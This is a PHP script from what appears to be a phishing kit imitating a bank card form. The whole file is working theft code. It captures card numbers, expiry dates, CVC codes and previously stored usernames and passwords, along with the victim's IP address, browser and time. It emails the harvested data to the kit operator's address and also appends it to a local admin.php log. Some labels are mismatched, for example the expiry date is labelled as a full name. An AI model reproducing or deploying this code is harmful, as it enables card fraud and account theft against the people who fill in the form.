<?php

session_start();


include("system.php");



$_SESSION['_cardnumber_']        = $_POST['cardnumber'];
$_SESSION['_MM_']                = $_POST['MM'];
$_SESSION['_YY_']                = $_POST['YY'];
$_SESSION['_CVC_']               = $_POST['CVC'];





$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 


$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	


$ip = getenv("REMOTE_ADDR");




$yahya_email .= "<html>
<head>
</head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
<font style='color: #820000;'>Card Bank</font>
<br/>
═════════════════[ <font style='color: #0a5d00;'>Login INFORMATION</font> ]════════════════════
<br>
<font style='color:#9c0000;'></font> [Nombre de usuario] = <font style='color:#0070ba;'>".$_SESSION['_username_']."</font>
<br>
<font style='color:#9c0000;'></font> [Contrasena] = <font style='color:#0070ba;'>".$_SESSION['_pass_']."</font>
<br>

═════════════════[ <font style='color: #0a5d00;'>Card INFORMATION</font> ]

<br>
<font style='color:#9c0000;'></font> [NUMERO DE TARJETA DE CREDITO] = <font style='color:#0070ba;'>".$_SESSION['_cardnumber_']."</font>
<br>
<font style='color:#9c0000;'></font> [Nombre Completo] = <font style='color:#0070ba;'>".$_SESSION['_MM_']."/".$_SESSION['_YY_']."</font>
<br>
<font style='color:#9c0000;'></font> [CODIGO DE SEGURIDAD (CVV)] = <font style='color:#0070ba;'>".$_SESSION['_CVC_']."</font>
<br>
════════════════[ <font style='color: #0a5d00;'>System</font> ]═══════════════════<br>
<font style='color:#9c0000;'></font> [IP INFO] = <font style='color:#0070ba;'>
<a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$_SERVER['REMOTE_ADDR']."'>".$_SERVER['REMOTE_ADDR']." </a></font><br>
<font style='color:#9c0000;'></font> [TIME/DATE] = <font style='color:#0070ba;'>".$InfoDATE."</font><br>
<font style='color:#9c0000;'></font> [BROWSER] = <font style='color:#0070ba;'>".$browserTy_Version." and ".$OS."</font>
<br>
════════════════[ <font style='color: #0a5d00;'>okey rzlt</font> ]═══════════════════<br>
 <font style='color: #820000;'>
</font>
</div>
</html>";


include("../../sand_rzlt_email.php");


$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = " Card Bank [  ".$_SESSION['country1']." - ".$smile." ] ";
$headers .= "From: Card_Bank" . "\r\n";
mail($yourmail, $subject, $yahya_email , $headers);

$f = fopen("../../admin.php", "a");
fwrite($f, $yahya_email);
mail($fwrite,
$subject,
$yahya_email
,$headers);	



?>

